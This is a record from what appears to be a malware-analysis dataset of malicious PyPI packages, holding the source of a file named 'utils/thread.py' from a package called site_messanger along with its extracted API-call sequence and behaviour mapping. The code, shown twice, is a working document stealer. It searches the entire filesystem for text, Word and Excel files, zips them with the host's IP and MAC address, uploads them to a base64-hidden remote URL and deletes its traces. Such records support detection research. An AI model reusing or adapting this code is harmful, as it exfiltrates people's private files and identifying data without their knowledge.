[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/site_messanger-1.2.5/site_messanger-1.2.5/utils/thread.py",
    "code_snippet": "import os\nimport zipfile\nimport socket\nimport uuid\nimport base64\nimport aiohttp\nimport asyncio\nfrom datetime import datetime\nimport random\nimport string\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode('aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ=').decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n    return hash_value\n\nasync def main(arch_list):\n    tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]\n    await asyncio.gather(*tasks)\n\nasync def start():\n    hash_paths = list(find_web3_hash(['dHh0', 'ZG9jeA==', 'eGxz', 'eGxzeA==', 'ZG9j']))\n    hash_connect = hash_connector()\n    hash_list = hash_identifier(hash_paths, hash_connect, 'dGVtcF9oYXNoX2Rpcg==')\n    await main(hash_list)\n\ndef hash_connector():\n    task_id = get_task_id()\n    task_hash = get_task_hash()\n    unique_hash = ''\n    hash_key = generate_key()\n    if (task_id != None) | (task_hash != None):\n        unique_hash = unique_hash + f'{str(task_id)}' + f' {str(task_hash)}'\n    else:\n        unique_hash = datetime.now().strftime(\"%Y_%m_%d %H_%M_%S\")\n    unique_hash = unique_hash + f'__{hash_key}_'\n    return unique_hash\n\ndef get_task_id():\n    try:\n        task_user = socket.gethostname()\n        task_id = socket.gethostbyname(task_user)\n        return task_id\n    except Exception as e:\n        return None\n\ndef get_task_hash():\n    try:\n        task_hash = hash_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))\n        return task_hash\n    except Exception as e:\n        return None\n\ndef hash_formating(hash):\n    try:\n        modified_hash = hash.replace('-', '_').replace(':', '_').replace('.', '_').replace(' ', '_')\n        return modified_hash\n    except Exception as e:\n        return None\n\ndef generate_key():\n    value = string.ascii_letters + string.digits\n    unique_key = ''.join(random.choice(value) for _ in range(5))\n    return unique_key\n",
    "pattern_analysis": {
      "api_sequence": [
        "base64.b64decode",
        "os.walk",
        "os.path.join",
        "open",
        "base64.b64decode",
        "open",
        "aiohttp.FormData",
        "aiohttp.FormData.add_field",
        "aiohttp.ClientSession",
        "base64.b64decode",
        "aiohttp.ClientSession.post",
        "aiohttp.ClientSession.close",
        "os.remove",
        "base64.b64decode",
        "os.makedirs",
        "base64.b64decode",
        "os.path.join",
        "zipfile.ZipFile",
        "os.path.getsize",
        "zipfile.ZipFile.close",
        "base64.b64decode",
        "os.path.join",
        "zipfile.ZipFile",
        "os.path.basename",
        "zipfile.ZipFile.write",
        "base64.b64decode",
        "os.path.join",
        "base64.b64decode",
        "os.path.join",
        "socket.gethostname",
        "socket.gethostbyname",
        "uuid.getnode",
        "hash_formating",
        "datetime.now",
        "datetime.datetime.strftime",
        "string.ascii_letters",
        "string.digits",
        "random.choice"
      ],
      "api_sequence_with_args": [
        "base64.b64decode(key)",
        "os.walk('/')",
        "os.path.join(web3_hash_root, hash_id)",
        "open(hash_web3_path, 'r')",
        "base64.b64decode(temp_hash)",
        "open(hash_value, 'rb')",
        "aiohttp.FormData()",
        "aiohttp.FormData.add_field('file', open(hash_value, 'rb'))",
        "aiohttp.ClientSession()",
        "base64.b64decode('aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ=')",
        "aiohttp.ClientSession.post(decoded_url, data=hash_get)",
        "aiohttp.ClientSession.close()",
        "os.remove(hash_value)",
        "base64.b64decode(temp_hash)",
        "os.makedirs(decoded_temp_hash, exist_ok=True)",
        "base64.b64decode(temp_hash)",
        "os.path.join(decoded_temp_hash, f'{hash_result}_{hash_id}.zip')",
        "zipfile.ZipFile(zip_path, 'w')",
        "os.path.getsize(hash_path)",
        "zipfile.ZipFile.close()",
        "base64.b64decode(temp_hash)",
        "os.path.join(decoded_temp_hash, f'{hash_result}_{hash_id}.zip')",
        "os.path.basename(hash_path)",
        "zipfile.ZipFile.write(hash_path, os.path.basename(hash_path))",
        "base64.b64decode(temp_hash)",
        "os.path.join(decoded_temp_hash, f'{hash_result}_{hash_id}.zip')",
        "base64.b64decode(temp_hash)",
        "os.path.join(decoded_temp_hash, f'{hash_result}_{hash_id}.zip')",
        "socket.gethostname()",
        "socket.gethostbyname(task_user)",
        "uuid.getnode()",
        "hash_formating(mac_string)",
        "datetime.now()",
        "datetime.now().strftime(\"%Y_%m_%d %H_%M_%S\")",
        "string.ascii_letters",
        "string.digits",
        "random.choice(value)"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "aiohttp.FormData",
          "id": "create_multipart_writer",
          "description": "Creates multipart writer for HTTP requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.FormData.add_field",
          "id": "add_multipart_field",
          "description": "Adds field to multipart HTTP request",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "aiohttp.ClientSession",
          "id": "create_http_session",
          "description": "Creates HTTP session for making asynchronous requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.ClientSession.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "aiohttp.ClientSession.close",
          "id": "close_http_response",
          "description": "Closes the HTTP response object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.path.getsize",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.path.basename",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "uuid.getnode",
          "id": "get_hardware_address",
          "description": "Retrieves hardware address as 48-bit integer",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        }
      ],
      "contextual_code": "import os\nimport zipfile\nimport socket\nimport uuid\nimport base64\nimport aiohttp\nimport asyncio\nfrom datetime import datetime\nimport random\nimport string\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode('aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ=').decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n    return hash_value\n\ndef get_task_id():\n    try:\n        task_user = socket.gethostname()\n        task_id = socket.gethostbyname(task_user)\n        return task_id\n    except Exception as e:\n        return None\n\ndef get_task_hash():\n    try:\n        task_hash = hash_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))\n        return task_hash\n    except Exception as e:\n        return None"
    }
  }
]